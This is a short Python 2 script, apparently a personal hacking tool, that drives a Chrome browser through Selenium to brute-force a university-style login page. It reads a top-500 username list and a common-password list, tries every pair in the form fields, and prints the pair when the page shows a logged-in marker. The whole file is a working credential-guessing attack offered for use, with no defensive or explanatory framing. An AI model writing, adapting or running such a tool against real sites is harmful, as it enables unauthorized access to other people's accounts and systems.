#coding:utf-8
#Author:LSA
#Descript:selenium for brute
#Data:201812



import time
import sys
from selenium import webdriver
from selenium.webdriver.common import action_chains, keys
import time

reload(sys) 
sys.setdefaultencoding('utf-8')



def BruteLogin(user,pwd):
    
    
        browser.get('http://xxx.edu.cn/login.jsp')
        browser.implicitly_wait(20)

        action = action_chains.ActionChains(browser)
        
        elem = browser.find_element_by_name("j_username")
        elem.send_keys(user)

        action.perform()
        
        elem=browser.find_element_by_name("j_password")
        elem.send_keys(pwd)

        action.perform()

        elem=browser.find_element_by_name("btn_submit")
        #print browser.current_window_handle
        #elem.click()

        action.send_keys("document.getElementsByName('btn_submit')[0].click()"+keys.Keys.ENTER)
        action.perform()
    
        time.sleep(1)
        if '当前用户' in browser.page_source:
        
            print 'Login Success:' + user + '|' + pwd
            sys.exit()
        else:
            print 'LoginFaild!'


browser = webdriver.Chrome()


def main():
        
    with open('usernameTop500.txt','r') as fuser:
            for user in fuser.readlines():
                    u = user.strip()
                    with open('topwdglobal.txt','r') as fpwd:
                        for pwd in fpwd.readlines():
                            p = pwd.strip()
                            print 'testing...' + u,p
                            BruteLogin(u,p)

    browser.quit()



if __name__ == '__main__':
    main()